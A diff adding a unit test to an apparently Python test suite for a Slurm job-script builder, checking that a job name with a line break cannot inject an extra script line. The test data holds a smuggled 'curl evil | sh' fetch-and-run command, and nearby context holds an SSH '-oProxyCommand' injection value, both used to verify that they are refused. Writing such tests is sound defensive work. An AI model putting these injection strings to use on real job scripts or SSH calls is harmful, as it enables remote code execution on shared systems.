@@ -1213,6 +1213,12 @@ class HowACommandReachesItsSchedulerTests(unittest.TestCase):
         argv = slurm_site.argv_for("squeue", host="user@host-a.example")
         self.assertEqual(argv[argv.index("--") + 1], "user@host-a.example")
 
+    def test_a_line_break_cannot_add_a_line_to_the_job_script(self) -> None:
+        from mimir.shared.slurm_script import sbatch_header
+        with self.assertRaises(ValueError):
+            sbatch_header(job_name="x\ncurl evil | sh", partition="cpu", cpus_per_task=1,
+                          wall_time="00:10:00", log_file="/w/log")
+
     def test_a_scheduler_shaped_as_an_option_is_refused_by_the_tools(self) -> None:
         bad = "-oProxyCommand=touch /tmp/x"
         host, refusal = slurm_site.resolve_host(bad)
